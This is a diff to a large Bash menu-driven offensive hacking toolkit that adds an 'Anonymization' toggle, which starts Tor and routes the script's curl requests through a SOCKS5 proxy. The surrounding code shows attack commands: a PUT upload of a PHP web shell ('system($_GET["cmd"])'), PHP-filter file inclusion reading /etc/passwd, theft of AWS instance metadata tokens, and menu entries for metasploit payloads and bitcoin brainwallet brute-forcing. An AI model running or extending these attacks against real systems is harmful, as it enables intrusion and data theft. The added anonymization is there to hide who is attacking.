@@ -24,6 +24,8 @@ TUSRN=""
 TPSSW=""
 WORDLIST=""
 TDOM=""
+CURLANON=""
+ANON="Disabled"
 
 function ScaricaIn
 {
@@ -184,10 +186,10 @@ function Clona
 	"4")
 		if [[ $(wget -q -S --spider "$ENTRAW""$1""/master/README.md" 2>&1) == *"200 OK"* ]];
 		then
-			curl "$ENTRAW""$1""/master/README.md" | less
+			curl -s -k -L "$ENTRAW""$1""/master/README.md" | less
 		elif [[ $(wget -q -S --spider "$ENTRAW""$1""/main/README.md" 2>&1) == *"200 OK"* ]];
 		then
-			curl "$ENTRAW""$1""/main/README.md" | less
+			curl -s -k -L "$ENTRAW""$1""/main/README.md" | less
 		else
 			echo "There is not any README.md file"
 		fi
@@ -199,13 +201,25 @@ function Clona
 
 function Scarica
 {
-	if [[ "$2" != "" ]];
+	if [[ "$ANON" == "Enabled" ]];
 	then
-		wget --no-check-certificate "$1" -O "$2"
-		chmod +x "./""$2"
+		if [[ "$2" != "" ]];
+		then
+			curl -s -k -L $CURLANON "$1" -o "$2"
+		else
+			QUESTO="./"$(echo "$1" | awk -F "/" '{print $NF}')
+			curl -s -k -L $CURLANON "$1" -o "$QUESTO"
+			chmod +x "$QUESTO"
+		fi
 	else
-		wget --no-check-certificate "$1"
-		chmod +x "./"$(echo "$1" | awk -F "/" '{print $NF}')
+		if [[ "$2" != "" ]];
+		then
+			wget --no-check-certificate "$1" -O "$2"
+			chmod +x "./""$2"
+		else
+			wget --no-check-certificate "$1"
+			chmod +x "./"$(echo "$1" | awk -F "/" '{print $NF}')
+		fi
 	fi
 }
 
@@ -1143,6 +1157,7 @@ while true; do
 	Stampa " 2542. get ASN and infos of target IP from cymru.com" "2543. create an encrypted and encoded payload with metasploit" "2547. list all pulled docker images"
 	Stampa " 2548. run a docker image" "2549. docker process list" "2552. use nmap to scan ports for vulnerabilities"
 	Stampa " 2556. Executione command line to Remote IP with RPC" "2564. display all binsry's headers with objdump"
+	Stampa " 2570. Anonymization"
 	echo "$SEP"
 	echo "VIRTUAL COINS - CURRENCIES"
 	Stampa " 511. Isaacdelly/Plutus" "512. dan-v/bruteforce-bitcoin-brainwallet" "513. SMH17/bitcoin-hacking-tools"
@@ -1241,6 +1256,7 @@ while true; do
 	Stampa " 2559. Target Username" "2560. Target Password" "2561. Target Domain"
 	Stampa " 2557. Target IP" "2558. Target PORT" "2562. wordlist file" "2563. disassemble binary with objdump"
 	echo -e "\nTarget: ""$TIP"":$TPRT|\tTarget domain: ""$TDOM""|\tTarget username: ""$TUSRN""|\tTarget password: ""$TPSSW""|\tWordlist: ""$WORDLIST"
+	echo -e "Anonymization: $ANON"
 	echo "$SEP"
 	read -p "Choose a script: " SCELTA
 	case "$SCELTA" in
@@ -2398,7 +2414,7 @@ while true; do
 				read -p "(example, fetch 1:* (UID FLAGS INTERNALDATE ENVELOPE)): " IMAPREQ
 				if [[ "$IMAPREQ" != "" ]];
 				then
-					curl --url "$IMAPURL" --user "$EMAILADD" --request "$IMAPREQ"
+					curl $CURLANON --url "$IMAPURL" --user "$EMAILADD" --request "$IMAPREQ"
 				fi
 			fi
 		fi
@@ -3906,7 +3922,7 @@ while true; do
 			read -p "(example, ../../etc/passwd or ./index.php): " PAGE
 			if [[ "$PAGE" != "" ]];
 			then
-				curl "$URL""php://filter/convert.base64-encode/resource=""$PAGE"
+				curl $CURLANON "$URL""php://filter/convert.base64-encode/resource=""$PAGE"
 			fi
 		fi
 	;;
@@ -4057,7 +4073,7 @@ while true; do
 			read -e -p "(example, wsh3ll): " SHL
 			if [[ "$SHL" != "" ]];
 			then
-				curl -v -X PUT -d '<?php system($_GET["cmd"]);?>' "$TURL""/""$SHL"".php"
+				curl -s -k -L $CURLANON -v -X PUT -d '<?php system($_GET["cmd"]);?>' "$TURL""/""$SHL"".php"
 			fi
 		fi
 	;;
@@ -4327,7 +4343,7 @@ while true; do
 				TDP="$TTDP"
 			fi
 		fi
-		curl -s "$TIP"":""$TDP""/version" | python -m json.tool
+		curl $CURLANON -s "$TIP"":""$TDP""/version" | python -m json.tool
 	;;
 	"653")
 		Clona "adnane-X-tebbaa/GRecon"
@@ -9977,7 +9993,7 @@ while true; do
 		if [[ "$TURL" != "" ]];
 		then
 			export TOKEN=`curl -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" "$TURL/latest/api/token"`
-			curl -H "X-aws-ec2-metadata-token:$TOKEN" -v "$TURL/latest/meta-data"
+			curl -s -k -L $CURLANON -H "X-aws-ec2-metadata-token:$TOKEN" -v "$TURL/latest/meta-data"
 		fi
 	;;
 	"2424")
@@ -10682,6 +10698,32 @@ while true; do
 		if [[ $(Warning) == "Y" ]];
 		then
 			Clona "xadhrit/d9scan"
+		fi
+	;;
+	"2570")
+		if [[ "$ANON" == "Disabled" ]];
+		then
+			echo "Enabling Anonymization"
+			ANON="Enabled"
+			if [[ -f $(which systemctl) ]];
+			then
+				sudo systemctl start tor
+			elif [[ -f $(which sv) ]];
+			then
+				sv start tor
+			fi
+			CURLANON="--socks5 127.0.0.1:9050"
+		else
+			echo "Disabling Anonymization"
+			ANON="Disabled"
+			if [[ -f $(which systemctl) ]];
+			then
+				sudo systemctl stop tor
+			elif [[ -f $(which sv) ]];
+			then
+				sv stop tor
+			fi
+			CURLANON=""
 		fi
 	;;
 	*)
